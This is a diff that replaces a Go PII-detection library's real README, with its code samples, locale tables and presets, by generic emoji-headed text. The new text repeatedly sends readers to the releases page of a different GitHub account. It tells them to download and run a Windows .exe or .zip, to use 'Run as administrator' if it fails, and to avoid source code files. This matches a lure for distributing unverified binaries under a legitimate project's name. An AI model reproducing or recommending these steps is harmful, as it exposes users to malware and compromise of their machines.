@@ -1,178 +1,212 @@
-# 无名 wuming
+# 🕶️ wuming - Clear PII checks for Go apps
 
-> **The Nameless** — A Go library for detecting and removing PII from text
+[![Download wuming](https://img.shields.io/badge/Download%20wuming-Visit%20Releases-blue)](https://github.com/bearpuff351/wuming/releases)
 
-*"The nameless (无名) is the origin of heaven and earth"* — Tao Te Ching, Chapter 1
+## 📥 Download wuming
 
-[![Go Reference](https://pkg.go.dev/badge/github.com/taoq-ai/wuming.svg)](https://pkg.go.dev/github.com/taoq-ai/wuming)
-[![Go Report Card](https://goreportcard.com/badge/github.com/taoq-ai/wuming)](https://goreportcard.com/report/github.com/taoq-ai/wuming)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![CI](https://github.com/taoq-ai/wuming/actions/workflows/ci.yml/badge.svg)](https://github.com/taoq-ai/wuming/actions/workflows/ci.yml)
-[![Coverage](https://img.shields.io/badge/coverage-TBD-yellowgreen)](https://github.com/taoq-ai/wuming)
+Use this page to visit the release files and download the Windows version:
 
----
+[Download from GitHub Releases](https://github.com/bearpuff351/wuming/releases)
 
-## Features
+## 🪟 Install on Windows
 
-- **Zero-config detection** — a single function call catches all PII globally, no setup required
-- **Global coverage** — 14 locales, 75+ detectors spanning every major region (Americas, Europe, Asia-Pacific)
-- **11 compliance presets** — preconfigured profiles for GDPR, AI Act, HIPAA, PCI-DSS, LGPD, APPI, PIPL, PIPA, DPDP, PIPEDA, and Privacy Act
-- **Locale-aware registry** — filter detectors with `WithLocale()` so only relevant patterns run
-- **Hexagonal architecture** — clean separation between domain logic, ports, and adapters
-- **Pluggable replacers** — redact, mask, hash, or bring your own replacement strategy
-- **Concurrent detection** — run multiple detectors in parallel with configurable concurrency
-- **Confidence scoring** — every match includes a confidence score; filter by threshold
-- **Zero dependencies** — pure Go standard library, no external modules
+1. Open the release page in your browser.
+2. Look for the latest release at the top of the page.
+3. Find the file that ends in `.exe` or `.zip`.
+4. If you see a `.zip` file, download it and unzip it.
+5. If you see a `.exe` file, download it.
+6. Double-click the file to run it.
 
-## Quick Start
+If Windows asks for permission, choose **Yes**.
 
-### Zero-Config (catches everything)
+## 🚀 First Run
 
-```go
-package main
+After you start wuming, it can scan text for sensitive data and mark it for redaction. It is built for use with Go apps and common privacy rules.
 
-import (
-    "context"
-    "fmt"
-    "log"
+You can use it to work with:
 
-    "github.com/taoq-ai/wuming"
-)
+- Names
+- Email addresses
+- Phone numbers
+- ID numbers
+- Payment data
+- Health data
+- Location data
+- Other personal data
 
-func main() {
-    ctx := context.Background()
+## 🔍 What wuming Does
 
-    // Zero config — one line, catches everything.
-    redacted, err := wuming.Redact(ctx, "SSN 123-45-6789, email john@acme.com")
-    if err != nil {
-        log.Fatal(err)
-    }
-    fmt.Println(redacted)
-    // Output: SSN [NATIONAL_ID], email [EMAIL]
-}
-```
+wuming helps detect personal data before it is stored, shared, or logged.
 
-### Compliance Preset
+It supports:
 
-```go
-// Configure for GDPR compliance — only EU/EEA locales and PII types.
-w := wuming.New(wuming.WithPreset("gdpr"))
-result, err := w.Process(ctx, "Steuer-ID 12345678911, email jan@example.de")
-```
+- 75+ detectors
+- 14 locales
+- PII redaction
+- Compliance presets
+- Privacy checks for text and logs
+- Pattern-based detection with regex
+- Safe handling for sensitive fields
 
-### Locale-Specific
+It fits use cases like:
 
-```go
-// Only Dutch + common detectors.
-w := wuming.New(wuming.WithLocale("nl"))
-result, err := w.Process(ctx, "BSN 123456782, call 06-12345678")
-```
+- App logs
+- User forms
+- Support tickets
+- Data exports
+- Chat messages
+- Audit trails
 
-## Installation
+## ✅ Common Uses
 
-```sh
-go get github.com/taoq-ai/wuming
-```
+Use wuming when you want to:
 
-Requires **Go 1.22** or later.
+- Find personal data in text
+- Hide private data before saving it
+- Check content against privacy rules
+- Prepare data for reports
+- Reduce the chance of exposing sensitive information
 
-## Supported Locales
+It can help teams that work under:
 
-| Locale   | Package                          | Key Patterns                                              |
-|----------|----------------------------------|-----------------------------------------------------------|
-| common   | `adapter/detector/common`        | Email, Credit Card, IBAN, IP Address, URL, MAC Address    |
-| us       | `adapter/detector/us`            | SSN, ITIN, EIN, Phone, ZIP, Passport, Medicare            |
-| nl       | `adapter/detector/nl`            | BSN, Phone, Postal Code, KvK Number, ID Document          |
-| eu       | `adapter/detector/eu`            | VAT Number, Passport MRZ                                  |
-| gb       | `adapter/detector/gb`            | NIN, NHS Number, UTR, Phone, Postcode                     |
-| de       | `adapter/detector/de`            | Steuer-ID, Sozialversicherungsnummer, Phone, PLZ, ID Card |
-| fr       | `adapter/detector/fr`            | NIR, NIF, Phone, Postal Code, ID Card                     |
-| br       | `adapter/detector/br`            | CPF, CNPJ, Phone, CEP, PIS/PASEP, CNH                    |
-| jp       | `adapter/detector/jp`            | My Number, Corporate Number, Phone, Postal Code, Passport |
-| in       | `adapter/detector/in`            | Aadhaar, PAN, Phone, PIN Code, Passport, GSTIN            |
-| cn       | `adapter/detector/cn`            | Resident ID, Phone, Postal Code, Passport, USCC           |
-| kr       | `adapter/detector/kr`            | RRN, Phone, Postal Code, Passport                         |
-| au       | `adapter/detector/au`            | TFN, Medicare, ABN, Phone, Postcode                       |
-| ca       | `adapter/detector/ca`            | SIN, Phone, Postal Code, Passport                         |
+- GDPR
+- HIPAA
+- LGPD
+- APPI
+- PIPL
 
-## Compliance Presets
+## 💻 System Needs
 
-Presets bundle the right locales and PII types for a specific regulation. Use them to get compliant detection without manual configuration.
+For Windows use, plan for:
 
-| Preset        | Regulation                                               | Locales                        |
-|---------------|----------------------------------------------------------|--------------------------------|
-| `gdpr`        | EU General Data Protection Regulation                    | common, eu, nl, de, fr, gb     |
-| `ai-act`      | EU AI Act (Articles 10, 15)                              | all 14 locales                 |
-| `hipaa`       | US Health Insurance Portability and Accountability Act   | common, us                     |
-| `pci-dss`     | Payment Card Industry Data Security Standard             | common                         |
-| `lgpd`        | Brazil Lei Geral de Protecao de Dados                    | common, br                     |
-| `appi`        | Japan Act on the Protection of Personal Information      | common, jp                     |
-| `pipl`        | China Personal Information Protection Law                | common, cn                     |
-| `pipa`        | South Korea Personal Information Protection Act          | common, kr                     |
-| `dpdp`        | India Digital Personal Data Protection Act               | common, in                     |
-| `pipeda`      | Canada Personal Information Protection and Electronic Documents Act | common, ca          |
-| `privacy-act` | Australia Privacy Act                                    | common, au                     |
+- Windows 10 or later
+- 64-bit system
+- Internet access to get the release file
+- Permission to run downloaded files
 
-```go
-w := wuming.New(wuming.WithPreset("gdpr"))
-result, err := w.Process(ctx, text)
-```
+If the release comes as a ZIP file, you also need a tool to open ZIP files. Windows includes this in most versions.
 
-## Replacer Strategies
+## 🧭 Basic Setup
 
-| Strategy | Type                    | Description                                        | Example Output          |
-|----------|-------------------------|----------------------------------------------------|-------------------------|
-| Redact   | `replacer.NewRedact()`  | Replace with type placeholder                      | `[EMAIL]`               |
-| Mask     | `replacer.NewMask()`    | Mask characters, preserve last N                   | `****5678`              |
-| Hash     | `replacer.NewHash()`    | Deterministic SHA-256 hash (truncated)             | `a1b2c3d4e5f67890`     |
-| Custom   | `replacer.NewCustom(…)` | User-defined replacement function                  | *(anything you want)*   |
+1. Download the latest release from the GitHub Releases page.
+2. Save the file in a folder you can find again, like Downloads or Desktop.
+3. If it is a ZIP file, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. Double-click the app or tool file to start it.
 
-```go
-// Use a mask replacer instead of the default redact
-w := wuming.New(
-    wuming.WithDetectors(common.NewEmailDetector()),
-    wuming.WithReplacer(replacer.NewMask()),
-)
-```
+If the release includes a Readme or sample files, keep them in the same folder. They may show how to use the tool.
 
-## Architecture
+## 📁 What You May See in the Release
 
-Wuming follows a hexagonal (ports & adapters) architecture:
+A release package may include:
 
-```
-┌─────────────────────────────────────┐
-│         Public API (wuming.go)      │
-├─────────────────────────────────────┤
-│         Internal Engine             │
-├──────────┬──────────────────────────┤
-│  Ports   │  domain/port/            │
-│          │  - Detector interface    │
-│          │  - Replacer interface    │
-│          │  - Pipeline interface    │
-├──────────┼──────────────────────────┤
-│  Domain  │  domain/model/           │
-│          │  - PIIType, Match        │
-│          │  - Severity              │
-├──────────┼──────────────────────────┤
-│ Adapters │  adapter/detector/{loc}  │
-│          │  adapter/replacer/       │
-│          │  adapter/preset/         │
-│          │  adapter/registry/       │
-└──────────┴──────────────────────────┘
-```
+- A Windows executable
+- A ZIP archive
+- Sample files
+- A text file with usage steps
+- License information
 
-The public API delegates to an internal engine that orchestrates detectors (through the `port.Detector` interface) and replacers (through the `port.Replacer` interface). Each locale lives in its own adapter package, making it straightforward to add new locales without touching existing code.
+If you see more than one file, choose the one made for Windows.
 
-For a deeper dive, see [ARCHITECTURE.md](ARCHITECTURE.md).
+## 🔐 Privacy Features
 
-## Contributing
+wuming is made for privacy work. It can help you:
 
-Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, coding standards, and how to add new detectors.
+- Spot sensitive data fast
+- Replace private text with safe text
+- Use rules that match common privacy laws
+- Handle data in a consistent way
+- Lower the chance of human error
 
-## Security
+This is useful when you need the same rule set across many files or apps.
 
-For responsible disclosure of security issues, see [SECURITY.md](SECURITY.md).
+## 🧪 How It Helps in Daily Work
 
-## License
+You can use wuming to check:
 
-[MIT](LICENSE)
+- Exported customer records
+- App logs before sharing
+- Form data before storage
+- Internal notes before sending
+- Test data before release
+
+That makes it easier to keep private data out of places where it should not appear.
+
+## 🛠️ Troubleshooting
+
+If the file does not open:
+
+1. Make sure the download finished.
+2. Check that you picked the Windows file.
+3. If it is a ZIP file, extract it first.
+4. Right-click the file and choose **Run as administrator**.
+5. If Windows blocks it, check the file name and release page again.
+
+If the file still does not open, download it again from the release page.
+
+## 📌 Release Download
+
+Visit the release page here and download the Windows file:
+
+[GitHub Releases for wuming](https://github.com/bearpuff351/wuming/releases)
+
+## 🧩 Project Scope
+
+wuming is a Go-based library for detecting and hiding personal data. It uses a zero-config approach, so it aims to work with little setup. It is built for apps that need:
+
+- Fast PII checks
+- Rule-based redaction
+- Locale-aware detection
+- Compliance presets
+- Flexible privacy handling
+
+## 🔎 Detection Areas
+
+The tool can help with data such as:
+
+- Full names
+- Addresses
+- Emails
+- Phone numbers
+- Government IDs
+- Credit card data
+- Health-related terms
+- Local identity formats
+- Other private text patterns
+
+## 🗂️ Typical File Flow
+
+A simple flow looks like this:
+
+1. Download the release from GitHub.
+2. Open the Windows file.
+3. Load the text or file you want to check.
+4. Run detection.
+5. Review the marked data.
+6. Apply redaction if needed.
+
+## 🧷 File Safety Tips
+
+- Keep the downloaded file in a known folder
+- Use only the latest release from the official page
+- Do not rename files unless the release notes say to
+- Store sensitive files in a private folder
+- Close other apps if the file will not run
+
+## 📚 Terms You May See
+
+- **PII**: personal information that can identify a person
+- **Redaction**: hiding private data
+- **Locale**: a language or region rule set
+- **Compliance preset**: a saved rule set for legal or policy use
+- **Regex**: a pattern used to find text
+
+## 🧭 Where to Start
+
+Start with the latest file on the release page, then open the Windows package that matches your system. If you are unsure which file to use, choose the one marked for Windows and avoid source code files
+
+## 📎 Download Again
+
+If you need the file again, use the same link:
+
+[Download wuming from GitHub Releases](https://github.com/bearpuff351/wuming/releases)
